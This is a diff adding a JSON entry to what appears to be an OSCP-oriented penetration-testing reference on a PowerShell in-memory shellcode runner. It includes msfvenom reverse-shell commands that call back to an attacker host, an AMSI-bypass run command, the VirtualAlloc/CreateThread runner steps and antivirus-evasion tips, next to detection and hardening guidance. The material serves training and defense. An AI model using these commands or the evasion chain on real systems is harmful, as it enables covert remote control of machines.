@@ -1,0 +1,99 @@
+{
+  "id": "powershell-shellcode-runner",
+  "name": "PowerShell In-Memory Shellcode Runner",
+  "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=443 -f ps1 -o sc.ps1",
+  "description": "Executes raw shellcode entirely in memory from PowerShell so nothing malicious is written to disk for on-disk AV to scan. The runner allocates RWX memory with VirtualAlloc, copies the shellcode in, and starts it with CreateThread via Add-Type / P-Invoke. Combined with an AMSI bypass, this slips past both signature and runtime script scanning.",
+  "type": "payload",
+  "platform": "windows",
+  "requires": [
+    "shell"
+  ],
+  "protocols": [
+    "tcp"
+  ],
+  "tools": [
+    "msfvenom",
+    "powershell"
+  ],
+  "tags": [
+    "av-evasion",
+    "in-memory",
+    "shellcode",
+    "powershell",
+    "runner"
+  ],
+  "category": "Exploitation",
+  "subcategory": "AV Evasion",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 14: Antivirus Evasion",
+  "examples": [
+    {
+      "label": "Generate raw shellcode as a PowerShell byte array (-f ps1)",
+      "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.128 LPORT=443 -f ps1 -o sc.ps1"
+    },
+    {
+      "label": "Generate shellcode as PS byte array with a named variable (-f powershell -v sc)",
+      "command": "msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=443 -f powershell -v sc"
+    },
+    {
+      "label": "Unlock script execution for CurrentUser before running the runner (if blocked)",
+      "command": "Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser"
+    },
+    {
+      "label": "Runner flow (P-Invoke Win32 APIs)",
+      "command": "# Add-Type imports VirtualAlloc / CreateThread / WaitForSingleObject, then: allocate RWX -> Marshal.Copy shellcode -> CreateThread(addr) -> WaitForSingleObject"
+    },
+    {
+      "label": "Run AMSI bypass first, then the runner (same session)",
+      "command": "powershell -ep bypass -c \"<amsi-bypass>; . .\\runner.ps1\""
+    }
+  ],
+  "notes": "Order matters: bypass AMSI in the session first, or Defender scans the runner script as it loads. msfvenom -f ps1 gives the shellcode byte array; wrap it in a runner that P-Invokes VirtualAlloc (0x1000 MEM_COMMIT, 0x40 PAGE_EXECUTE_READWRITE), Marshal.Copy the bytes in, CreateThread to the address, then WaitForSingleObject to keep the process alive. Because the payload lives only in memory, on-disk scanning never sees it - but behavioral detection can still flag the RWX alloc + thread, so pair with a clean process and minimal footprint. A staged payload keeps the on-disk/first-stage tiny. Prefer x64 shellcode in a 64-bit PowerShell. Also covered in: OSCP PEN-200 Chapter 14 (Antivirus Evasion).",
+  "references": [
+    {
+      "title": "OffSec PEN-200 - Antivirus Evasion",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    },
+    {
+      "title": "MITRE ATT&CK - Reflective Code Loading",
+      "url": "https://attack.mitre.org/techniques/T1620/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "amsi-bypass",
+      "rel": "prereq",
+      "note": "Neutralise AMSI before the runner script loads."
+    },
+    {
+      "id": "process-injection-runner",
+      "rel": "alternative",
+      "note": "Compiled C# injection into a remote process instead of PowerShell."
+    }
+  ],
+  "opsec": "moderate",
+  "mitre": [
+    "T1620",
+    "T1059.001"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "PowerShell can allocate executable memory (VirtualAlloc), copy shellcode bytes into it (Marshal.Copy), and execute it (CreateThread or via a delegate callback). This in-memory execution never touches disk \u2014 avoiding file-based AV scanning. The shellcode (typically Meterpreter or a custom C2 beacon) runs within the PowerShell process, making EDR detection dependent on behavioral and memory scanning rather than file scanning.",
+    "prerequisites": "PowerShell execution. AMSI bypass applied first (otherwise the shellcode bytes are scanned in-memory by AMSI before execution). WinAPI calls available (full language mode or via add-type). Shellcode from msfvenom or custom C2.",
+    "impact": "T1620 Reflective Code Loading + T1059.001 PowerShell. Executes arbitrary shellcode in-memory within PowerShell process. Provides a Meterpreter/C2 session without writing any payload to disk. Evades file-based and many signature-based AV products.",
+    "detection": "AMSI: scans the shellcode bytes before execution (caught if AMSI not bypassed). ETW: PowerShell provider logs VirtualAlloc + CreateThread from PowerShell script. EDR: process injection pattern from PowerShell (API calls: VirtualAlloc \u2192 WriteProcessMemory \u2192 CreateThread is a classic shellcode injection sequence). Memory scan: shellcode in PowerShell process memory. Defender: 'PowerShell Shellcode Injection' behavioral alert.\nAnomalous memory allocation and execution within the same process (VirtualAlloc \u2192 memcpy \u2192 VirtualProtect \u2192 CreateThread); unlike process injection, all activity occurs within the process own PID context (DET0300/AN0838).\nIn-process mmap + mprotect + execve/execveat where permissions change from writable to executable without a corresponding ELF on disk (AN0839).\nSuspicious dlopen(), dlsym(), or mmap with RWX flags in processes that do not normally perform dynamic module loading; anonymous memory regions executed by user processes (AN0840).",
+    "artifacts": "AMSI block if not bypassed | ETW: VirtualAlloc+CreateThread in PowerShell script context | EDR alert: shellcode injection from PowerShell | Memory scan: MZ header or shellcode patterns in PS process memory | Network: C2 beacon from powershell.exe",
+    "prevention": "AMSI (catches shellcode bytes before execution). EDR with memory scanning (detects post-execution). CLM (prevents add-type and direct WinAPI calls). PowerShell SBL + ETW for detection. Network detection: C2 traffic from PowerShell is anomalous in most environments.\nThis technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features.\nAntivirus/Antimalware: Auto-quarantine of malicious scripting interpreter activity.\nAudit: Inventory interpreter usage to detect unexpected scripting binaries.\nBehavior Prevention on Endpoint: Windows 10 ASR rules blocking VBScript and JScript execution.\nCode Signing: Permit only signed scripts; block unsigned interpreter executions.\nDisable or Remove Feature or Program: Remove unused shells and scripting interpreters.\nExecution Prevention: Application control (WDAC/AppLocker); PowerShell Constrained Language Mode (restrict Add-Type).\nPrivileged Account Management: Restrict PowerShell execution policy to admins; use PowerShell Just Enough Administration (JEA).\nRestrict Web-Based Content: Script-blocking browser extensions and ad blockers.",
+    "evasion": "Apply AMSI bypass before injecting shellcode. Encode shellcode (XOR with random key) and decode at runtime. Use indirect syscalls instead of VirtualAlloc/CreateThread API calls. Use process injection into a different process (explorer.exe) rather than running shellcode in PowerShell itself.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1620/",
+      "https://attack.mitre.org/techniques/T1059/001/"
+    ],
+    "misconfiguration": "AMSI disabled or bypassed. CLM not enforced. No ETW monitoring. EDR without memory scanning capability. PowerShell outbound network not monitored.",
+    "vulnerable_config": "# No CLM:\n$ExecutionContext.SessionState.LanguageMode  # FullLanguage\n# \u2192 Add-Type with unsafe code compiles WinAPI calls\n# \u2192 [System.Runtime.InteropServices.Marshal]::Copy() works to write shellcode\n\n# AMSI bypassed before runner executes:\n# amsiInitFailed = True \u2192 no AMSI scan of shellcode bytes",
+    "secure_config": "# CLM via WDAC prevents WinAPI calls from PS:\n# AllowMicrosoft base policy \u2192 PowerShell restricted to CLM\n# \u2192 [System.Runtime.InteropServices.Marshal] unavailable\n\n# Enable Script Block Logging (captures shellcode bytes before execution):\nSet-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name EnableScriptBlockLogging -Value 1\n\n# Network rule: alert on powershell.exe making outbound connections to non-corporate IPs:\n# Sysmon Event 3: Image contains powershell.exe AND DestinationIp NOT IN (corporate_ranges) \u2192 ALERT"
+  }
+}
